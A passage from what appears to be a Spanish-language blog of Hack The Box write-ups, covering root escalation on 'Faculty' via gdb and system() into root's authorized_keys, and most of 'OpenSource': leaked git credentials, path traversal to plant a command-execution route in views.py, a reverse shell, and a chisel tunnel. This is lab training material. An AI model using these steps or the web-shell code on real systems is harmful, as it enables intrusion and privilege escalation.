g_get_system_config_dirs@plt 0x00007f5077263c40 g_get_system_data_dirs@plt 0x00007f5077266c10 g_filesystem_preview_type_get_type 0x00007f507728c060 g_file_query_filesystem_info 0x00007f507728c1f0 g_file_query_filesystem_info_async 0x00007f507728c2b0 g_file_query_filesystem_info_finish 0x00007f50772b3450 g_mount_operation_get_is_tcrypt_system_volume 0x00007f50772b34b0 g_mount_operation_set_is_tcrypt_system_volume 0x00007f50772e3740 g_tls_connection_set_use_system_certdb 0x00007f50772e37d0 g_tls_connection_get_use_system_certdb 0x00007f50772ff1e0 g_unix_is_mount_path_system_internal 0x00007f50772ff2a0 g_unix_is_system_fs_type 0x00007f50772ff340 g_unix_is_system_device_path 0x00007f50773001f0 g_unix_mount_is_system_internal 0x00007f50771e7610 mnt_guess_system_root 0x00007f50771b4520 selinux_systemd_contexts_path 0x00007f5076f64b50 _dbus_init_system_log 0x00007f5076f659c0 _dbus_user_database_lock_system 0x00007f5076f659e0 _dbus_user_database_unlock_system 0x00007f5076f65d00 _dbus_user_database_get_system 0x00007f5076f66830 _dbus_error_from_system_errno 0x00007f5076ec94c0 sd_device_get_subsystem 0x00007f5076ecb8a0 sd_device_get_parent_with_subsystem_devtype 0x00007f5076ecba10 sd_device_new_from_subsystem_sysname 0x00007f5076ecdba0 sd_device_monitor_filter_add_match_subsystem_devtype 0x00007f5076ece3b0 sd_device_enumerator_get_subsystem_next 0x00007f5076ece8c0 sd_device_enumerator_add_match_subsystem 0x00007f5076ed3650 sd_device_enumerator_get_subsystem_first 0x00007f5076ed3ce0 sd_bus_default_system 0x00007f5076ee2f60 sd_bus_open_system_machine 0x00007f5076ee3180 sd_bus_open_system_remote 0x00007f5076ee34c0 sd_bus_open_system_with_description 0x00007f5076ee3640 sd_bus_open_system (gdb) Intentamos crear un archivo utilizando esta funcion con touch, observamos que el archivo fué creado por el usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 (gdb) call system(\u0026#34;touch /tmp/filex\u0026#34;) [Detaching after vfork from child process 7104] $1 = 0 (gdb) q A debugging session is active. Inferior 1 [process 690] will be detached. Quit anyway? (y or n) y Detaching from program: /usr/bin/python3.8, process 690 [Inferior 1 (process 690) detached] developer@faculty:~$ ls -lah /tmp total 48K drwxrwxrwt 12 root root 4.0K Jul 20 04:14 . drwxr-xr-x 19 root root 4.0K Jul 20 04:14 .. drwxrwxrwt 2 root root 4.0K Jul 20 01:40 .ICE-unix drwxrwxrwt 2 root root 4.0K Jul 20 01:40 .Test-unix drwxrwxrwt 2 root root 4.0K Jul 20 01:40 .X11-unix drwxrwxrwt 2 root root 4.0K Jul 20 01:40 .XIM-unix drwxrwxrwt 2 root root 4.0K Jul 20 01:40 .font-unix -rw-r--r-- 1 root root 0 Jul 20 04:14 filex drwx------ 3 root root 4.0K Jul 20 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-ModemManager.service-BNZLMf drwx------ 3 root root 4.0K Jul 20 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-logind.service-9pz07g drwx------ 3 root root 4.0K Jul 20 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-resolved.service-cxLYYg drwx------ 3 root root 4.0K Jul 20 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-timesyncd.service-ApuWBf drwx------ 2 root root 4.0K Jul 20 01:40 vmware-root_669-3980232826 developer@faculty:~$ Shell Agregamos la clave publica de developer al archivo authorized_keys de root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 developer@faculty:~/.ssh$ ls authorized_keys id_rsa id_rsa.pub known_hosts developer@faculty:~/.ssh$ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEMCCsdwPYjhTfb3/+x1qmfidxXNFhnEAIL9zPGZI7lSzZLzt3HLCLNnSEOzMfKT5sIHkHXC+u2YAW7Yo3hoYKgAkw0aZWhwGciRJzMan/MHLSlUrofuDoYwBVKmuJtf8Ot0cJyawi7taqTJnSYM3axL7e4yTojffrXHbO0AbVoL3ElfsQmweZcNEtnwbVGJsqkjRaoBY1JccMO9zAOmZYOT42UhEqSkZxUHLOEbzHVrO8pZL0bfrN4ssBEE/jdrHh4BWuwB37uKDe+X0i/5m1HOQfQ+wyGuIiUcE1TL10UAY/lprhlSRgeLX8yUGexY6CJEcyBwnNxZc4Z4glu1x2nZoE6NmUYn4bq4tavHCVf1qczeA9dNPgMaplXVCn/f4lkXX38pcnV2vSLfbyOxoyXMOKMXltmOkA5wvFLRXzi331H/ttFst0XEwT/THJvpAwpwwOcusNSZ2GI5tE5kWXe/mGexb0KgUuIoT/iNYo/qU9T7fUY5Okq0tdgwNtx6k= developer@faculty developer@faculty:~/.ssh$ pwd /home/developer/.ssh developer@faculty:~/.ssh$ gdb -p 690 -q Attaching to process 690 Reading symbols from /usr/bin/python3.8... [.. snip ..] 29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory. (gdb) call system(\u0026#34;cat /home/developer/.ssh/id_rsa.pub \u0026gt; /root/.ssh/authorized_keys\u0026#34;) [Detaching after vfork from child process 7458] $1 = 0 (gdb) q A debugging session is active. Inferior 1 [process 690] will be detached. Quit anyway? (y or n) y Detaching from program: /usr/bin/python3.8, process 690 [Inferior 1 (process 690) detached] developer@faculty:~/.ssh$ Logramos ingresamos como root por SSH en localhost y obtener nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 developer@faculty:~/.ssh$ ssh root@localhost Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 20 04:24:24 CEST 2022 System load: 0.0 Processes: 238 Usage of /: 74.9% of 4.67GB Users logged in: 2 Memory usage: 46% IPv4 address for eth0: 10.10.11.169 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings You have mail. root@faculty:~# whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /root root@faculty:~# ls check_cron.sh root.txt service_check.sh root@faculty:~# cat root.txt 0bcbf940d39d911f5f5eab105fb57894 root@faculty:~# ","description":"La creación de PDFs a partir de etiquetas HTML de mPDF nos permitió obtener credenciales de una base de datos, los cuales nos dieron acceso a un primer usuario por SSH. Tras realizar Command Injection logramos obtener acceso a un segundo usuario. Finalmente escalamos privilegios a traves de GDB.","id":14,"section":"posts","tags":["sqli","sqlmap","mPDF","meta-git","capabilities","command injection","gdb"],"title":"Hack The Box - Faculty","uri":"https://sckull.github.io/posts/faculty/"},{"content":"\rOpenSource expone el codigo fuente de una aplicación, tras analizar el codigo, descubrimos que es posible escribir y acceder a archivos localmente, con ello sobreescribimos el codigo de la aplicación para ejecutar comandos, para luego acceder a un contenedor. Dentro, descubrimos Gitea corriendo en un puerto no expuesto, obtuvimos el puerto localmente para luego descubrir una clave privada SSH que nos dió acceso a la máquina. Finalmete escalamos privilegios tras la ejecución de un cronjob como root con Git.\nNombre OpenSource OS Linux Puntos 20 Dificultad Facil IP 10.10.11.164 Maker irogir\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.7, 4.8, 5.2, 4.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 10, 8, 2, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 # Nmap 7.92 scan initiated Sun Jun 19 19:41:44 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.164 Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Sun, 19 Jun 2022 23:41:51 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;upcloud - Upload files for Free!\u0026lt;/title\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/jquery/jquery-3.4.1.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/popper/popper.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/vendor/bootstrap/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;script src=\u0026#34;/static/js/ie10-viewport-bug-workaround.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/vendor/bootstrap/css/bootstrap.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-grid.css\u0026#34;/\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34; /static/vendor/bootstrap/css/bootstrap-reboot.css\u0026#34;/\u0026gt; | \u0026lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Sun, 19 Jun 2022 23:41:51 GMT | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS | Content-Length: 0 | Connection: close | RTSPRequest: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request version (\u0026#39;RTSP/1.0\u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-title: upcloud - Upload files for Free! |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 [.. snip ..] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 19 19:43:19 2022 -- 1 IP address (1 host up) scanned in 95.15 seconds Web Site Los headers del sitio web muestran Werkzeug y la version de Python, por lo que podría tratarse de una aplicación escrita en Flask, Django o web2py.\n1 2 3 4 5 6 7 8 9 π ~/htb/opensource ❯ curl -sI 10.10.11.164 HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.10.3 Date: Mon, 20 Jun 2022 00:11:10 GMT Content-Type: text/html; charset=utf-8 Content-Length: 5316 Connection: close π ~/htb/opensource ❯ Se menciona que es un sitio para transferencia de archivos, tambien se muestran dos botones, el primero permite la descarga de un archivo zip.\nEl segundo es una ruta para subir archivos.\nTras subir un archivo nos retorna una url.\nTras visitar la url vemos el contenido del archivo subido.\n1 2 3 π ~/htb/opensource ❯ curl -s http://10.10.11.164/uploads/a.txt hello there π ~/htb/opensource ❯ Directory Brute Forcing feroxbuster muestra unicamente dos direcciones.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/opensource ❯ feroxbuster -u http://10.10.11.164/ -w $MD --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.164/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 0l 0w 2489147c http://10.10.11.164/download 200 GET 45l 144w 1563c http://10.10.11.164/console [####################] - 33m 220545/220545 0s found:2 errors:93 [####################] - 33m 220545/220545 110/s http://10.10.11.164/ π ~/htb/opensource ❯ La dirección /download nos retorna el archivo zip, la dirección /console muestra la consola de Werkzeug, aunque es necesario el PIN para acceder a esta.\nRepo - source Tras descomprimir el archivo zip, vemos que es un repositorio, se observa un archivo de Docker para la aplicación.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π repository public ❯ l total 28K drwxr-xr-x 5 kali kali 4.0K Jun 19 21:58 . drwxr-xr-x 5 kali kali 4.0K Jun 19 21:57 .. drwxrwxr-x 5 kali kali 4.0K Apr 28 07:45 app -rwxr-xr-x 1 kali kali 110 Apr 28 07:40 build-docker.sh drwxr-xr-x 2 kali kali 4.0K Apr 28 07:34 config -rw-rw-r-- 1 kali kali 574 Apr 28 08:50 Dockerfile drwxrwxr-x 8 kali kali 4.0K Jun 19 22:43 .git π repository public ❯ π repository public ❯ tree -L 3 . ├── app │ ├── app │ │ ├── configuration.py │ │ ├── __init__.py │ │ ├── static │ │ ├── templates │ │ ├── utils.py │ │ └── views.py │ ├── INSTALL.md │ ├── public │ │ └── uploads │ └── run.py ├── build-docker.sh ├── config │ └── supervisord.conf └── Dockerfile 7 directories, 9 files π repository public ❯ Logs Tras ejecutar git log --all vemos todos los commits realizados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -\u0026gt; public) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:55:55 2022 +0200 clean up dockerfile for production use commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev) Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:47:24 2022 +0200 ease testing commit be4da71987bbbc8fae7c961fb2de01ebd0be1997 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:54 2022 +0200 added gitignore commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:45:17 2022 +0200 initial (END) En uno de ellos muestra unas credenciales (dev01:Soulless_Developer#2022), mismas que son eliminadas en un siguiente commit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser \u0026lt;gituser@local\u0026gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json new file mode 100644 index 0000000..5975e3f --- /dev/null +++ b/app/.vscode/settings.json @@ -0,0 +1,5 @@ +{ + \u0026#34;python.pythonPath\u0026#34;: \u0026#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\u0026#34;, + \u0026#34;http.proxy\u0026#34;: \u0026#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\u0026#34;, + \u0026#34;http.proxyStrictSSL\u0026#34;: false +} [ .. snip .. ] Vemos que las credenciales no nos permiten el acceso por SSH.\n1 2 3 4 5 6 7 8 π ~/htb/opensource ❯ ssh dev01@10.10.11.164 # dev01:Soulless_Developer#2022 The authenticity of host \u0026#39;10.10.11.164 (10.10.11.164)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.164\u0026#39; (ED25519) to the list of known hosts. dev01@10.10.11.164: Permission denied (publickey). π ~/htb/opensource ❯ Upcloud Observamos en el codigo fuente dos rutas, la primera permite subir archivos y la segunda acceder aun archivo segun la ruta dada sin algun tipo de filtro. Además encontramos el archivo utils.py que contiene funciones para direcciones de archivo seguras, en este caso vemos que reemplaza cualquier string con valor ../.\nviews.py \u0026amp; utils.py\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: f = request.files[\u0026#39;file\u0026#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, file_name) f.save(file_path) return render_template(\u0026#39;success.html\u0026#39;, file_url=request.host_url + \u0026#34;uploads/\u0026#34; + file_name) return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/uploads/\u0026lt;path:path\u0026gt;\u0026#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, \u0026#34;uploads\u0026#34;, path)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import time def current_milli_time(): return round(time.time() * 1000) \u0026#34;\u0026#34;\u0026#34; Pass filename and return a secure version, which can then safely be stored on a regular file system. \u0026#34;\u0026#34;\u0026#34; def get_file_name(unsafe_filename): return recursive_replace(unsafe_filename, \u0026#34;../\u0026#34;, \u0026#34;\u0026#34;) \u0026#34;\u0026#34;\u0026#34; TODO: get unique filename \u0026#34;\u0026#34;\u0026#34; def get_unique_upload_name(unsafe_filename): spl = unsafe_filename.rsplit(\u0026#34;\\\\.\u0026#34;, 1) file_name = spl[0] file_extension = spl[1] return recursive_replace(file_name, \u0026#34;../\u0026#34;, \u0026#34;\u0026#34;) + \u0026#34;_\u0026#34; + str(current_milli_time()) + \u0026#34;.\u0026#34; + file_extension \u0026#34;\u0026#34;\u0026#34; Recursively replace a pattern in a string \u0026#34;\u0026#34;\u0026#34; def recursive_replace(search, replace_me, with_me): if replace_me not in search: return search return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me) Upcloud - Local Localmente ejecutamos la app, observamos que tras no enviar algun archivo se muestra la dirección completa de donde se encuentra la app. De igual forma podemos obtener esta información en los archivos de configuracion de Docker.\nAdemás observamos que es posible escribir y sobre escribir archivos que la app utiliza, vemos en este caso el archivo configuration.py y el archivo hello.txt en home respectivamente.\nTambién podemos acceder a cualquier archivo conociendo su dirección completa, en este caso configuration.py.\nUser - Container Upcloud RCE - Local Sabiendo que podemos sobreescribir archivos de la app, vamos a crear y agregar una nueva ruta en views.py que nos permita ejecutar comandos. En este caso utilizando la librería os que ya está definida en este archivo.\n1 2 3 4 5 6 7 @app.route(\u0026#39;/cmd/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def cmd(): if request.args.get(\u0026#39;cmd\u0026#39;): r = os.popen(request.args.get(\u0026#39;cmd\u0026#39;)).read() return r else: return \u0026#34;no cmd\u0026#34; Observamos que tras agregar estas lineas de codigo tuvo efecto.\nTras ejecutar el comando id vemos el resultado.\n1 2 3 π source/app/app public ✗ ❯ curl -s \u0026#34;http://192.168.171.128/cmd/?cmd=id\u0026#34; uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer) π source/app/app public ✗ ❯ Upcloud RCE Tras lograr ejecutar comandos localmente realizamos lo mismo esta vez en la máquina, vemos que el directorio de la app es /app/.\nConfirmamos la ruta de views.py.\nTras sobreescribir el archivo vemos que se agregó la nueva ruta.\nTras ejecutar id vemos que tenemos acceso, en este caso como root.\n1 2 3 π ~/htb/opensource ❯ curl -s \u0026#34;http://10.10.11.164/cmd/?cmd=id\u0026#34; uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) π ~/htb/opensource ❯ Shell Ejecutamos una shell inversa con python (codificado en URL), logrando obtener una shell como root.\n1 2 3 4 5 6 7 π ~/htb/opensource ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from 10.10.11.164 [10.10.11.164] 57730 /bin/sh: can\u0026#39;t access tty; job control turned off /app # whoami root /app # nmap Utilizando una version estatica de nmap, observamos distintas direcciones disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 /root # ./nmap -n -sn 172.17.0.* -oG - | awk \u0026#39;/Up$/{print $2}\u0026#39; | sort -V Cannot find nmap-payloads. UDP payloads are disabled. Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed 172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8 172.17.0.9 /root # Descubrimos que la dirección 172.17.0.1 tiene puertos abiertos, vemos el puerto 3000.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /root # ./nmap -p- --min-rate 3000 172.17.0.1 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-20 04:32 GMT Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for 172.17.0.1 Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed Host is up (0.000027s latency). Not shown: 65524 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open unknown 6000/tcp open x11 6001/tcp open x11-1 6002/tcp open x11-2 6003/tcp open x11-3 6004/tcp open x11-4 6005/tcp open x11-5 6006/tcp open x11-6 6007/tcp open x11-7 MAC Address: 02:42:F9:EF:38:86 (Unknown) dsap done: 1 IP address (1 host up) scanned in 52.13 secon /root # Tras realizar una solicitud a este vemos que se trata de Gitea.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /root # wget 172.17.0.1:3000 Connecting to 172.17.0.1:3000 (172.17.0.1:3000) saving to \u0026#39;index.html\u0026#39; index.html 100% |********************************| 13414 0:00:00 ETA \u0026#39;index.html\u0026#39; saved /root # head index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;title\u0026gt; Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19\u0026#34;/\u0026gt; \u0026lt;meta name=\u0026#34;theme-color\u0026#34; content=\u0026#34;#6cc644\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;default-theme\u0026#34; content=\u0026#34;auto\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;author\u0026#34; content=\u0026#34;Gitea - Git with a cup of tea\u0026#34; /\u0026gt; /root # Si observamos dicho puerto esta \u0026ldquo;filtrado\u0026rdquo; en la máquina y unicamente es accesible localmente.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/opensource ❯ nmap 10.10.11.164 -p 3000 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 00:39 EDT Nmap scan report for 10.10.11.164 (10.10.11.164) Host is up (0.066s latency). PORT STATE SERVICE 3000/tcp filtered ppp Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds π ~/htb/opensource ❯ dev01 - User Chisel Utilizamos chisel para obtener el puerto 3000 localmente.\n1 2 3 4 5 # Kali ./chisel server -p 8181 --reverse # OpenSource container ./chisel client 10.10.14.207:8181 R:3000:172.17.0.1:3000 Vemos localmente que el puerto 3000 esta a la escucha.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/opensource ❯ netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:8081 0.0.0.0:* LISTEN 127483/python3 tcp 0 0 0.0.0.0:8082 0.0.0.0:* LISTEN 192804/python3 tcp6 0 0 :::3000 :::* LISTEN 205526/./chisel tcp6 0 0 127.0.0.1:8080 :::* LISTEN 57754/java tcp6 0 0 :::8181 :::* LISTEN 205526/./chisel tcp6 0 0 127.0.0.1:46315 :::* LISTEN 57754/java π ~/htb/opensource ❯ Tras visitar el puerto 3000 localmente logramos acceder a Gitea.\nUtilizando las credenciales que encontramos en el repositorio logramos acceder.\nEl único repositorio del usuario dev01 es un backup del directorio /home, vemos que tambien está la carpeta .ssh donde encontramos la clave privada ssh.\nShell Utilizando este archivo logramos obtener acceso como dev01 y obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/opensource ❯ ssh -i dev01_id_rsa dev01@10.10.11.164 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Jun 20 04:50:27 UTC 2022 System load: 0.1 Processes: 220 Usage of /: 75.8% of 3.48GB Users logged in: 0 Memory usage: 25% IP address for eth0: 10.10.11.164 Swap usage: 0% 